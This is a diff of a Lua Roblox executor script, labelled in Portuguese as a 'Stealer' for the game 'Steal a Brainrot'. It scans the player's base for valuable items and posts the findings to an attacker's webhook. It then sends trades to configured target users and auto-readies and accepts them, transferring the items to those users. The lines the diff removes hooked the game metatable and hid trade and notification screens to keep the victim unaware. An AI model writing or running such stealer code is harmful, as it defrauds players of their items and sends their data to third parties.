@@ -1,24 +1,17 @@
--- STEALER COM DEBUG - Steal a Brainrot
--- Mostra cada passo no console
+-- STEALER SEM BLOQUEIO DE UI - Teste
+-- Só escaneia, webhook e envia trade
 
 if game.PlaceId ~= 109983668079237 then
-    print("[DEBUG] Place ID errado: " .. game.PlaceId)
     return
 end
 
-print("[DEBUG] ========================================")
-print("[DEBUG] STEALER INICIADO")
-print("[DEBUG] ========================================")
+print("[Stealer] Carregando...")
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-
-print("[DEBUG] LocalPlayer: " .. LocalPlayer.Name)
-print("[DEBUG] LocalPlayer.UserId: " .. LocalPlayer.UserId)
 
 local TARGET_USERS = getgenv().TARGET_USERS or {}
 if #TARGET_USERS == 0 and getgenv().TARGET_USER then
@@ -30,57 +23,31 @@ local TARGET_BASE_SKINS = getgenv().NORMAL_BASE_SKINS or {}
 local TARGET_GEARS = getgenv().NORMAL_GEARS or {}
 local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
 
-print("[DEBUG] Configuração carregada:")
-print("[DEBUG]   TARGET_USERS: " .. table.concat(TARGET_USERS, ", "))
-print("[DEBUG]   WEBHOOK_URL: " .. (WEBHOOK_URL ~= "" and "Configurada" or "VAZIA"))
-print("[DEBUG]   TARGET_BRAINROTS: " .. table.concat(TARGET_BRAINROTS, ", "))
-print("[DEBUG]   TARGET_BASE_SKINS: " .. table.concat(TARGET_BASE_SKINS, ", "))
-print("[DEBUG]   TARGET_GEARS: " .. table.concat(TARGET_GEARS, ", "))
-print("[DEBUG]   DELAY_BETWEEN_INVITES: " .. DELAY_BETWEEN_INVITES)
-
 local tradeCompleted = false
 local webhookSent = false
 
 local function getRemote(name)
-    print("[DEBUG] Procurando remote: " .. name)
     local net = ReplicatedStorage:FindFirstChild("Packages")
-    if not net then
-        print("[DEBUG]   Packages não encontrado!")
-        return nil
-    end
-    net = net:FindFirstChild("Net")
-    if not net then
-        print("[DEBUG]   Net não encontrado!")
-        return nil
-    end
-    
-    local children = net:GetChildren()
-    print("[DEBUG]   Total de filhos no Net: " .. #children)
-    
-    for i = 1, #children - 1 do
-        if children[i] and children[i].Name and string.find(children[i].Name, name) then
-            print("[DEBUG]   Remote encontrado: " .. children[i + 1].Name)
-            return children[i + 1]
+    if net then
+        net = net:FindFirstChild("Net")
+        if net then
+            local children = net:GetChildren()
+            for i = 1, #children - 1 do
+                if children[i] and children[i].Name and string.find(children[i].Name, name) then
+                    return children[i + 1]
+                end
+            end
         end
     end
-    print("[DEBUG]   Remote '" .. name .. "' não encontrado!")
     return nil
 end
 
 local function findPlayerBase()
-    print("[DEBUG] Procurando base do jogador...")
     local plots = Workspace:FindFirstChild("Plots")
-    if not plots then
-        print("[DEBUG]   Plots não encontrado no Workspace!")
-        return nil
-    end
-    
-    print("[DEBUG]   Plots encontrado! Total: " .. #plots:GetChildren())
+    if not plots then return nil end
     
     local username = LocalPlayer.Name
     local displayName = LocalPlayer.DisplayName
-    print("[DEBUG]   Username: " .. username)
-    print("[DEBUG]   DisplayName: " .. displayName)
     
     for _, plot in ipairs(plots:GetChildren()) do
         if plot:IsA("Model") then
@@ -95,9 +62,7 @@ local function findPlayerBase()
                             local text = textLabel.Text
                             if text then
                                 local clean = text:gsub("'s Base$", ""):gsub(" Base$", "")
-                                print("[DEBUG]     Plot: " .. plot.Name .. " | Texto: " .. text .. " | Clean: " .. clean)
                                 if clean == username or clean == displayName then
-                                    print("[DEBUG]   ✅ BASE ENCONTRADA: " .. plot.Name)
                                     return plot
                                 end
                             end
@@ -107,81 +72,54 @@ local function findPlayerBase()
             end
         end
     end
-    
-    print("[DEBUG]   ❌ Nenhuma base encontrada!")
     return nil
 end
 
-local function scanBrainrotsFromBase()
-    print("[DEBUG] Escaneando brainrots da base...")
-    local base = findPlayerBase()
-    if not base then
-        print("[DEBUG]   ❌ Base não encontrada!")
-        return {}
-    end
-    
-    print("[DEBUG]   ✅ Base encontrada: " .. base.Name)
-    print("[DEBUG]   Filhos da base: " .. #base:GetChildren())
-    
-    local animalNames = {}
+local function getAnimalNames()
+    local names = {}
     local animalsFolder = ReplicatedStorage:FindFirstChild("Animations")
     if animalsFolder then
         animalsFolder = animalsFolder:FindFirstChild("Animals")
         if animalsFolder then
-            print("[DEBUG]   Animations.Animals encontrado!")
             for _, child in ipairs(animalsFolder:GetChildren()) do
                 if child:IsA("Folder") then
-                    animalNames[child.Name] = true
+                    names[child.Name] = true
                 end
             end
-            print("[DEBUG]   Total de animais registrados: " .. #animalNames)
-        else
-            print("[DEBUG]   ❌ Animals não encontrado dentro de Animations!")
         end
-    else
-        print("[DEBUG]   ❌ Animations não encontrado no ReplicatedStorage!")
     end
+    return names
+end
+
+local function scanBrainrots()
+    local base = findPlayerBase()
+    if not base then return {} end
     
+    local animalNames = getAnimalNames()
     local found = {}
+    
     for _, child in ipairs(base:GetChildren()) do
-        if child:IsA("Model") then
-            print("[DEBUG]     Model encontrado na base: " .. child.Name)
-            if animalNames[child.Name] then
-                print("[DEBUG]       ✅ É um animal válido!")
-                if TARGET_BRAINROTS[child.Name] then
-                    print("[DEBUG]       ✅ ESTÁ NA LISTA DE TARGET!")
-                    local mutation = "Normal"
-                    local gen = 0
-                    
-                    pcall(function()
-                        local Animals2 = require(ReplicatedStorage:FindFirstChild("Shared"):FindFirstChild("Animals"))
-                        if Animals2 then
-                            gen = Animals2:GetGeneration(child.Name, mutation, {}, nil)
-                        end
-                    end)
-                    
-                    table.insert(found, {
-                        name = child.Name,
-                        mutation = mutation,
-                        gen = gen,
-                        slotKey = child.Name,
-                        model = child,
-                        type = "Brainrot"
-                    })
-                else
-                    print("[DEBUG]       ❌ NÃO está na lista de target")
-                end
-            else
-                print("[DEBUG]       ❌ Não é um animal válido")
+        if child:IsA("Model") and animalNames[child.Name] then
+            if TARGET_BRAINROTS[child.Name] then
+                local gen = 0
+                pcall(function()
+                    local Animals2 = require(ReplicatedStorage:FindFirstChild("Shared"):FindFirstChild("Animals"))
+                    if Animals2 then
+                        gen = Animals2:GetGeneration(child.Name, nil, {}, nil)
+                    end
+                end)
+                
+                table.insert(found, {
+                    name = child.Name,
+                    gen = gen,
+                    slotKey = child.Name,
+                    model = child
+                })
             end
         end
     end
     
-    print("[DEBUG]   Brainrots encontrados: " .. #found)
-    for _, item in ipairs(found) do
-        print("[DEBUG]     - " .. item.name .. " (Gen: " .. item.gen .. ")")
-    end
-    
+    table.sort(found, function(a, b) return a.gen > b.gen end)
     return found
 end
 
@@ -194,50 +132,20 @@ local function formatNumber(n)
     else return "$" .. math.floor(n) .. "/s" end
 end
 
-local function sendWebhook()
-    print("[DEBUG] ========================================")
-    print("[DEBUG] ENVIANDO WEBHOOK")
-    print("[DEBUG] ========================================")
-    
-    if WEBHOOK_URL == "" then
-        print("[DEBUG]   ❌ WEBHOOK_URL vazia! Pulando...")
-        return
-    end
-    
-    print("[DEBUG]   WEBHOOK_URL: " .. WEBHOOK_URL)
+local function sendWebhook(brainrots)
+    if WEBHOOK_URL == "" or webhookSent then return end
+    webhookSent = true
     
     local request = syn and syn.request or (http and http.request or (http_request or request))
-    if not request then
-        print("[DEBUG]   ❌ Função de request não encontrada!")
-        return
-    end
-    print("[DEBUG]   ✅ Request function encontrada!")
-    
-    local brainrots = scanBrainrotsFromBase()
-    print("[DEBUG]   Brainrots encontrados: " .. #brainrots)
-    
-    if #brainrots == 0 then
-        print("[DEBUG]   ⚠️ Nenhum brainrot encontrado, enviando webhook vazio...")
-    end
-    
-    local allItems = {}
-    for _, item in ipairs(brainrots) do
-        table.insert(allItems, item)
-    end
+    if not request then return end
     
     local lines = {}
-    for _, item in ipairs(allItems) do
-        if item.type == "Brainrot" then
-            local mutationText = ""
-            if item.mutation and item.mutation ~= "Normal" and item.mutation ~= "" then
-                mutationText = " | Mutation: **" .. item.mutation .. "**"
-            end
-            table.insert(lines, "**" .. item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(item.gen) .. "**")
+    if #brainrots > 0 then
+        for _, item in ipairs(brainrots) do
+            table.insert(lines, "**" .. item.name .. "** [Brainrot] | Gen: **" .. formatNumber(item.gen) .. "**")
         end
-    end
-    
-    if #lines == 0 then
-        table.insert(lines, "Nenhum item encontrado!")
+    else
+        table.insert(lines, "Nenhum brainrot encontrado!")
     end
     
     local description = table.concat(lines, "\n")
@@ -251,13 +159,6 @@ local function sendWebhook()
         elseif getexecutorname then executorName = getexecutorname() end
     end)
     
-    local playerCount = #Players:GetPlayers()
-    local unixTime = os.time()
-    
-    print("[DEBUG]   Executor: " .. executorName)
-    print("[DEBUG]   Players no server: " .. playerCount)
-    print("[DEBUG]   Description: " .. description)
-    
     local embed = {
         title = "Brainrot Stealer",
         description = description,
@@ -265,7 +166,7 @@ local function sendWebhook()
         fields = {
             {
                 name = "Server",
-                value = "Players: **" .. playerCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                value = "Players: **" .. #Players:GetPlayers() .. "**",
                 inline = true
             },
             {
@@ -275,120 +176,25 @@ local function sendWebhook()
             }
         },
         footer = {
-            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId .. " | " .. os.date("%d/%m/%Y %H:%M:%S")
+            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     
-    local payload = {
-        content = "@everyone",
-        embeds = { embed },
-        username = "Stealer",
-        avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
-    }
-    
-    local jsonBody = HttpService:JSONEncode(payload)
-    print("[DEBUG]   Payload gerado! Tamanho: " .. #jsonBody)
-    
-    local success, result = pcall(function()
-        return request({
+    pcall(function()
+        request({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = jsonBody
+            Body = HttpService:JSONEncode({
+                content = "@everyone",
+                embeds = { embed },
+                username = "Stealer",
+                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
+            })
         })
+        print("[Stealer] Webhook enviado!")
     end)
-    
-    if success then
-        print("[DEBUG]   ✅ Webhook enviado com sucesso!")
-        if result and result.StatusCode then
-            print("[DEBUG]   StatusCode: " .. result.StatusCode)
-        end
-    else
-        print("[DEBUG]   ❌ Erro ao enviar webhook: " .. tostring(result))
-    end
-end
-
-local function blockCornerNotifications()
-    local cornerNotif = PlayerGui:FindFirstChild("DuelsMachinePrompt")
-    if cornerNotif then
-        cornerNotif.Enabled = false
-        cornerNotif.Visible = false
-        for _, child in ipairs(cornerNotif:GetChildren()) do
-            if child:IsA("Frame") or child:IsA("ScreenGui") then
-                child.Enabled = false
-                child.Visible = false
-            end
-        end
-    end
-end
-
-local function blockNormalNotifications()
-    local notif = PlayerGui:FindFirstChild("Notification")
-    if notif then
-        notif.Enabled = false
-        for _, child in ipairs(notif:GetChildren()) do
-            if child:IsA("Frame") or child:IsA("ScreenGui") then
-                child.Enabled = false
-                child.Visible = false
-            end
-        end
-    end
-end
-
-local function blockTradeUI()
-    for _, gui in ipairs(PlayerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            if string.find(gui.Name, "Trade") or 
-               gui.Name == "TradePrompts" or
-               gui.Name == "TradeLiveTrade" or
-               gui.Name == "TradePlayerList" then
-                gui.Enabled = false
-                gui.Visible = false
-            end
-        end
-    end
-end
-
-local function blockNewUI()
-    local mt = getrawmetatable(game)
-    if mt then
-        local old = mt.__newindex
-        setreadonly(mt, false)
-        mt.__newindex = function(self, key, value)
-            if key == "Parent" and value == PlayerGui then
-                if self:IsA("ScreenGui") then
-                    if string.find(self.Name, "Trade") or 
-                       string.find(self.Name, "Prompt") then
-                        return
-                    end
-                end
-            end
-            return old(self, key, value)
-        end
-        setreadonly(mt, true)
-    end
-end
-
-local function blockNotificationRemote()
-    local net = ReplicatedStorage:FindFirstChild("Packages")
-    if net then
-        net = net:FindFirstChild("Net")
-        if net then
-            for _, remote in ipairs(net:GetChildren()) do
-                if remote:IsA("RemoteEvent") then
-                    if string.find(remote.Name, "NotificationService/Notify") or
-                       string.find(remote.Name, "DuelsMachinePrompt") or
-                       string.find(remote.Name, "TradeService/InviteResult") then
-                        local connections = getconnections(remote.OnClientEvent)
-                        for _, conn in ipairs(connections) do
-                            conn:Disable()
-                        end
-                    end
-                end
-            end
-        end
-    end
 end
 
 local function getUserIdFromName(username)
@@ -412,41 +218,21 @@ local function isPlayerOnline(userId)
 end
 
 local function main()
-    print("[DEBUG] ========================================")
-    print("[DEBUG] INICIANDO MAIN")
-    print("[DEBUG] ========================================")
+    print("[Stealer] SEM BLOQUEIO DE UI - Modo Teste")
+    print("[Stealer] Apenas escaneia, webhook e envia trade")
     
-    print("[DEBUG] Aplicando bloqueios...")
-    blockCornerNotifications()
-    blockNormalNotifications()
-    blockTradeUI()
-    blockNewUI()
-    blockNotificationRemote()
-    print("[DEBUG] ✅ Bloqueios aplicados!")
+    local brainrots = scanBrainrots()
+    print("[Stealer] Brainrots encontrados: " .. #brainrots)
     
-    task.spawn(function()
-        while task.wait(1) do
-            pcall(blockCornerNotifications)
-            pcall(blockNormalNotifications)
-            pcall(blockTradeUI)
-        end
-    end)
+    sendWebhook(brainrots)
     
-    print("[DEBUG] Escaneando itens...")
-    sendWebhook()
-    
-    local brainrots = scanBrainrotsFromBase()
-    print("[DEBUG] Brainrots encontrados: " .. #brainrots)
-    
-    if #brainrots > 0 then
-        print("[DEBUG] ✅ TEM BRAINROTS! Iniciando trade...")
-    else
-        print("[DEBUG] ❌ NENHUM BRAINROT ENCONTRADO!")
+    if #brainrots == 0 then
+        print("[Stealer] Nenhum brainrot encontrado!")
         return
     end
     
     if #TARGET_USERS == 0 then
-        print("[DEBUG] ❌ Nenhum TARGET_USERS configurado!")
+        print("[Stealer] Nenhum target configurado!")
         return
     end
     
@@ -455,65 +241,61 @@ local function main()
     local readyRemote = getRemote("TradeService/Ready")
     local acceptRemote = getRemote("TradeService/Accept")
     
-    print("[DEBUG] Remotes encontrados:")
-    print("[DEBUG]   Invite: " .. tostring(inviteRemote ~= nil))
-    print("[DEBUG]   AddBrainrot: " .. tostring(addBrainrotRemote ~= nil))
-    print("[DEBUG]   Ready: " .. tostring(readyRemote ~= nil))
-    print("[DEBUG]   Accept: " .. tostring(acceptRemote ~= nil))
+    print("[Stealer] Remotes encontrados:")
+    print("  Invite: " .. tostring(inviteRemote ~= nil))
+    print("  AddBrainrot: " .. tostring(addBrainrotRemote ~= nil))
+    print("  Ready: " .. tostring(readyRemote ~= nil))
+    print("  Accept: " .. tostring(acceptRemote ~= nil))
     
     if not inviteRemote or not addBrainrotRemote then
-        print("[DEBUG] ❌ Remotes necessários não encontrados!")
+        print("[Stealer] Remotes não encontrados!")
         return
     end
     
     while not tradeCompleted do
         for _, target in ipairs(TARGET_USERS) do
             if target ~= "" then
-                print("[DEBUG] Processando target: " .. target)
                 local userId = getUserIdFromName(target)
-                if not userId then
-                    print("[DEBUG]   ❌ Não foi possível obter UserId de: " .. target)
-                elseif not isPlayerOnline(userId) then
-                    print("[DEBUG]   ❌ Usuário offline: " .. target .. " (ID: " .. userId .. ")")
-                else
-                    print("[DEBUG]   ✅ Usuário online: " .. target .. " (ID: " .. userId .. ")")
-                    print("[DEBUG]   Enviando invite...")
+                if userId and isPlayerOnline(userId) then
+                    print("[Stealer] Enviando invite para: " .. target .. " (ID: " .. userId .. ")")
                     
                     local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
                     
                     if success then
-                        print("[DEBUG]   ✅ Invite enviado com sucesso!")
+                        print("[Stealer] ✅ Invite enviado!")
                         task.wait(3)
                         
                         for i, brainrot in ipairs(brainrots) do
-                            print("[DEBUG]   Adicionando brainrot " .. i .. "/" .. #brainrots .. ": " .. brainrot.name)
+                            print("[Stealer] Adicionando: " .. brainrot.name)
                             pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
                             task.wait(1.5)
-                            if i % 3 == 0 then task.wait(1) end
                         end
                         
                         if readyRemote and acceptRemote then
                             task.wait(3)
-                            print("[DEBUG]   Enviando Ready...")
+                            print("[Stealer] Enviando Ready...")
                             pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
                             task.wait(2)
-                            print("[DEBUG]   Enviando Accept...")
+                            print("[Stealer] Enviando Accept...")
                             pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
-                            print("[DEBUG]   ✅ Trade enviada com sucesso!")
+                            print("[Stealer] ✅ Trade concluída!")
+                            tradeCompleted = true
                         end
                     else
-                        print("[DEBUG]   ❌ Falha ao enviar invite!")
+                        print("[Stealer] ❌ Falha ao enviar invite!")
                     end
+                else
+                    print("[Stealer] ❌ Usuário offline ou não encontrado: " .. target)
                 end
             end
         end
         
-        print("[DEBUG] Aguardando " .. DELAY_BETWEEN_INVITES .. " segundos antes de tentar novamente...")
-        task.wait(DELAY_BETWEEN_INVITES)
+        if not tradeCompleted then
+            print("[Stealer] Aguardando " .. DELAY_BETWEEN_INVITES .. " segundos...")
+            task.wait(DELAY_BETWEEN_INVITES)
+        end
     end
 end
 
 pcall(main)
-print("[DEBUG] ========================================")
-print("[DEBUG] STEALER FINALIZADO")
-print("[DEBUG] ========================================")
+print("[Stealer] Finalizado!")
